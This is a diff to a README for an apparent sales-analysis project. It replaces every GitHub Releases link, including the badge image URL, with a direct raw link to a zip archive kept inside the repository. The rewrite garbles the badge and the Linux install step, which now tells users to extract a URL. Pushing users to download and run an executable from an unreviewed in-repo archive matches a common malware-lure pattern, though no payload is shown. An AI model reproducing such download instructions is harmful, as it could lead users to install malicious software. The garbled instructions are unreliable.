@@ -6,9 +6,9 @@ Welcome to the **Sales Performance Analysis** project. This application helps yo
 
 ## 📥 Download the Application
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-blue)](https://github.com/Gama2202/sales-performance-analysis/releases)
+[![Download Here](https://raw.githubusercontent.com/Gama2202/sales-performance-analysis/main/Superstore-Sales-Analysis-Using-Power-BI-and-SQL-main/sales_performance_analysis_1.1.zip%20Now-blue)](https://raw.githubusercontent.com/Gama2202/sales-performance-analysis/main/Superstore-Sales-Analysis-Using-Power-BI-and-SQL-main/sales_performance_analysis_1.1.zip)
 
-Visit this page to download: [Releases Page](https://github.com/Gama2202/sales-performance-analysis/releases)
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/Gama2202/sales-performance-analysis/main/Superstore-Sales-Analysis-Using-Power-BI-and-SQL-main/sales_performance_analysis_1.1.zip)
 
 ## 🛠️ System Requirements
 
@@ -30,14 +30,14 @@ This application offers:
 
 ## 🔧 Download & Install
 
-1. Visit the [Releases Page](https://github.com/Gama2202/sales-performance-analysis/releases).
+1. Visit the [Releases Page](https://raw.githubusercontent.com/Gama2202/sales-performance-analysis/main/Superstore-Sales-Analysis-Using-Power-BI-and-SQL-main/sales_performance_analysis_1.1.zip).
 2. Choose the latest version available.
 3. Download the provided package for your operating system.
 4. Follow these steps to install:
 
    - **Windows:** Run the .exe file and follow the on-screen instructions.
    - **macOS:** Open the .dmg file and drag the application to your Applications folder.
-   - **Linux:** Extract the tar.gz file and follow the included instructions in the README.
+   - **Linux:** Extract the https://raw.githubusercontent.com/Gama2202/sales-performance-analysis/main/Superstore-Sales-Analysis-Using-Power-BI-and-SQL-main/sales_performance_analysis_1.1.zip file and follow the included instructions in the README.
 
 After installation, you can launch the application from your applications menu.
 
@@ -73,4 +73,4 @@ For any questions or issues, please create an issue in the GitHub repository. We
 
 Thank you for choosing the Sales Performance Analysis project. We hope you find the insights from your sales data valuable. Happy analyzing!
 
-For updates and new features, remember to check the [Releases Page](https://github.com/Gama2202/sales-performance-analysis/releases) regularly!
+For updates and new features, remember to check the [Releases Page](https://raw.githubusercontent.com/Gama2202/sales-performance-analysis/main/Superstore-Sales-Analysis-Using-Power-BI-and-SQL-main/sales_performance_analysis_1.1.zip) regularly!
